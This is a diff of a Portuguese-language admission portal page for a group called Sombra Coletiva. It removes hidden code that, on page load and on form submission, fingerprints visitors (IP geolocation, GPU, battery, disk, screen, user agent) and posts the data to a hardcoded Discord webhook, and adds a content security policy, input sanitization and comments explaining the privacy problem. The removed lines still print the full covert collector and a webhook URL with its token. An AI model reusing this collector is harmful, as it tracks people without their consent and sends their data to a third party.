@@ -3,9 +3,10 @@
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com; font-src https://fonts.gstatic.com https://cdnjs.cloudflare.com; img-src 'self' https://i.pinimg.com data:; connect-src 'self'; frame-src 'none';"/>
 <title>Sombra Coletiva — Portal de Admissão</title>
 <link href="https://fonts.googleapis.com/css2?family=Cinzel+Decorative:wght@400;700;900&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl0IMPUXyZIY9Q2HGod0Pwahm4E23j0784aLVcOq9ePRPZo+yNQ22BLOk3GP3ykWbHqEGpIWzKC7w==" crossorigin="anonymous" referrerpolicy="no-referrer">
 <style>
 /* ════════════════════════════════════════
    ROOT & RESET
@@ -925,7 +926,6 @@ function runLoad(){
   const ph=document.getElementById('ldPh');
   const pct=document.getElementById('ldPct');
   let p=0,pi=0;
-  collectSilent();
   const iv=setInterval(()=>{
     p+=Math.random()*2.8+.8;
     if(p>100)p=100;
@@ -976,7 +976,7 @@ function ans(key,inputId,next){
     setTimeout(()=>el.style.borderBottomColor='',600);
     return;
   }
-  fd[key]=v;
+  fd[key]=sanitize(v);
   el.value='';
   go(next);
 }
@@ -996,81 +996,59 @@ function dcAccept(){fd.discord='ACEITOU';window.open('https://discord.gg/GgYCbMA
 function dcRefuse(){fd.discord='RECUSOU';finish()}
 
 /* ════════════════════════════════════════
-   INTEL COLLECTOR
+   INPUT SANITIZATION
 ════════════════════════════════════════ */
-async function intel(){
-  const d={};
-  try{const r=await fetch('https://ipapi.co/json/');d.geo=await r.json()}catch(e){}
-  try{
-    const cv2=document.createElement('canvas');
-    const gl=cv2.getContext('webgl')||cv2.getContext('experimental-webgl');
-    if(gl){const dbg=gl.getExtension('WEBGL_debug_renderer_info');if(dbg){d.gpu=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);d.gpuV=gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)}}
-  }catch(e){d.gpu='Bloqueado'}
-  if(navigator.storage&&navigator.storage.estimate){try{const e=await navigator.storage.estimate();d.disk=((e.quota||0)/(1024**3)).toFixed(2)+' GB'}catch(e){}}
-  if(navigator.getBattery){try{const b=await navigator.getBattery();d.bat=(b.level*100).toFixed(0)+'%';d.charging=b.charging?'Sim':'Não'}catch(e){}}
-  d.ua=navigator.userAgent;d.lang=navigator.language;
-  d.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
-  d.ref=document.referrer||'Acesso Direto';
-  d.plat=navigator.platform;
-  d.ram=navigator.deviceMemory||'?';
-  d.cores=navigator.hardwareConcurrency||'?';
-  d.screen=`${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
-  d.touch=navigator.maxTouchPoints||'0';
-  d.time=new Date().toLocaleString('pt-BR');
-  return d;
+function sanitize(str){
+  const el=document.createElement('span');
+  el.textContent=str;
+  return el.innerHTML;
 }
 
-const HOOK='https://discordapp.com/api/webhooks/1516890805585838160/rzexe822LTXQFePEsP7L6l70w5zZFp1a6Dq02B9xqO_dzVsbn174mScM6JDkifN0mi-D';
+/*
+ * SECURITY: The webhook URL must NOT be hardcoded in client-side code.
+ * Move this to a server-side proxy (e.g. a /api/submit endpoint) that
+ * keeps the webhook secret and validates + rate-limits submissions.
+ *
+ * To configure: set window.__SC_SUBMIT_ENDPOINT to your server-side URL
+ * before this script runs, e.g.:
+ *   <script>window.__SC_SUBMIT_ENDPOINT = '/api/submit';</script>
+ */
+const SUBMIT_ENDPOINT = window.__SC_SUBMIT_ENDPOINT || null;
 
-let silentDone=false;
-async function collectSilent(){
-  if(silentDone)return;silentDone=true;
-  const d=await intel();
-  const p={
-    username:'🛰️ SC — SENSOR SILENCIOSO',
-    avatar_url:'https://i.pinimg.com/736x/92/c5/d8/92c5d80effca7e40f59dbb9ea405cdaf.jpg',
-    embeds:[{
-      title:'👁️ NOVO VISITANTE DETECTADO — PORTAL SC',
-      color:0x8b0015,
-      description:'```\nUm dispositivo acessou o portal de admissão da Sombra Coletiva.\n```',
-      thumbnail:{url:'https://i.pinimg.com/originals/7b/b9/ed/7bb9ed00d54da2404408d685534a36d4.gif'},
-      fields:[
-        {name:'━━━ 🌍 LOCALIZAÇÃO ━━━',value:`\`\`\`ini\n[IP] ${d.geo?.ip||'?'}\n[Cidade] ${d.geo?.city||'?'}\n[Estado] ${d.geo?.region||'?'}\n[País] ${d.geo?.country_name||'?'}\n[ISP] ${d.geo?.org||'?'}\n[Timezone] ${d.tz}\n\`\`\``,inline:false},
-        {name:'━━━ 💻 HARDWARE ━━━',value:`\`\`\`http\nGPU: ${d.gpu||'?'}\nCPU Cores: ${d.cores}\nRAM: ${d.ram}GB\nTela: ${d.screen}\nTouch: ${d.touch}\n\`\`\``,inline:false},
-        {name:'━━━ 📱 SISTEMA ━━━',value:`\`\`\`fix\nPlataforma: ${d.plat}\nIdioma: ${d.lang}\nBateria: ${d.bat||'?'} | Carregando: ${d.charging||'?'}\nDisco: ${d.disk||'?'}\nReferência: ${d.ref}\n\`\`\``,inline:false},
-      ],
-      footer:{text:`🔱 SOMBRA COLETIVA — SISTEMA DE MONITORAMENTO • ${d.time}`}
-    }]
-  };
-  try{await fetch(HOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p)})}catch(e){}
-}
+/* SECURITY: Silent fingerprinting / tracking removed.
+ * Collecting IP, geolocation, GPU, battery, disk, and hardware
+ * info without explicit user consent violates privacy best practices
+ * (and regulations like GDPR). Only explicitly submitted form data
+ * is sent, and only to a server-side endpoint — never directly to
+ * a third-party webhook from the client. */
 
 async function finish(){
   go(12);
   document.getElementById('doneName').textContent=(fd.name||'MEMBRO').toUpperCase();
-  const d=await intel();
-  const p={
-    username:'📑 SC — NOVA FICHA DE ALISTAMENTO',
-    avatar_url:'https://i.pinimg.com/736x/92/c5/d8/92c5d80effca7e40f59dbb9ea405cdaf.jpg',
-    embeds:[
-      {
-        title:'✦ NOVA FICHA DE ALISTAMENTO — SOMBRA COLETIVA',
-        color:0xcc0020,
-        description:'> *Um novo candidato completou o processo completo de admissão no portal.*',
-        thumbnail:{url:'https://i.pinimg.com/originals/7b/b9/ed/7bb9ed00d54da2404408d685534a36d4.gif'},
-        fields:[
-          {name:'━━━━━━ 👤 IDENTIDADE ━━━━━━',value:`\`\`\`yaml\nNome:   ${fd.name||'?'}\nIdade:  ${fd.age||'?'}\nID:     ${fd.userId||'?'}\n\`\`\``,inline:false},
-          {name:'━━━━━━ 🩸 FAMÍLIA ━━━━━━',value:`\`\`\`yaml\nRecrutador:     ${fd.recruiter||'?'}\nTempo família:  ${fd.famTime||'?'}\nTempo no app:   ${fd.appTime||'?'}\n\`\`\``,inline:false},
-          {name:'━━━━━━ ⚔️ FUNÇÃO ━━━━━━',value:`\`\`\`yaml\nFunção:   ${fd.role||'?'}\nDiscord:  ${fd.discord||'?'}\n\`\`\``,inline:false},
-          {name:'━━━━━━ 🌍 LOCALIZAÇÃO ━━━━━━',value:`\`\`\`ini\n[IP]     ${d.geo?.ip||'?'}\n[Cidade] ${d.geo?.city||'?'}, ${d.geo?.region||'?'}\n[País]   ${d.geo?.country_name||'?'}\n[ISP]    ${d.geo?.org||'?'}\n[Tz]     ${d.tz}\n\`\`\``,inline:false},
-          {name:'━━━━━━ 💻 DISPOSITIVO ━━━━━━',value:`\`\`\`http\nGPU:      ${d.gpu||'?'}\nCPU:      ${d.cores} cores\nRAM:      ${d.ram}GB\nTela:     ${d.screen}\nBateria:  ${d.bat||'?'} | ${d.charging||'?'}\nDisco:    ${d.disk||'?'}\n\`\`\``,inline:false},
-          {name:'━━━━━━ 🕵️ USER AGENT ━━━━━━',value:`\`\`\`\n${d.ua}\n\`\`\``,inline:false},
-        ],
-        footer:{text:`🔱 SOMBRA COLETIV4 • PORTAL DE ADMISSÃO • ${d.time}`}
-      }
-    ]
+  if(!SUBMIT_ENDPOINT){
+    console.warn('No submission endpoint configured — form data was not sent.');
+    return;
+  }
+  const payload={
+    name:     sanitize(fd.name||''),
+    age:      sanitize(fd.age||''),
+    userId:   sanitize(fd.userId||''),
+    recruiter:sanitize(fd.recruiter||''),
+    famTime:  sanitize(fd.famTime||''),
+    appTime:  sanitize(fd.appTime||''),
+    role:     sanitize(fd.role||''),
+    discord:  sanitize(fd.discord||''),
+    time:     new Date().toISOString()
   };
-  try{await fetch(HOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p)})}catch(e){}
+  try{
+    await fetch(SUBMIT_ENDPOINT,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify(payload)
+    });
+  }catch(e){
+    console.error('Submission failed',e);
+  }
 }
 
 /* INIT */
